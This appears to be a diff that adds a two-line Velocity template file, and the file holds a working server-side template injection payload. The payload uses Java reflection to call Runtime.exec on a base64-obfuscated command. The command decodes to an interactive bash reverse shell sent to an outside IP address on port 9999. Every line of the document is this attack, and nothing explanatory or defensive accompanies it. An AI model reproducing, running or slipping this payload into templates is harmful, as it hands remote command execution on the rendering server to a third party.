@@ -1,0 +1,2 @@
+#set($e="e")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82Ni4yMy4xOTUuOTEvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}",null,null).toString();
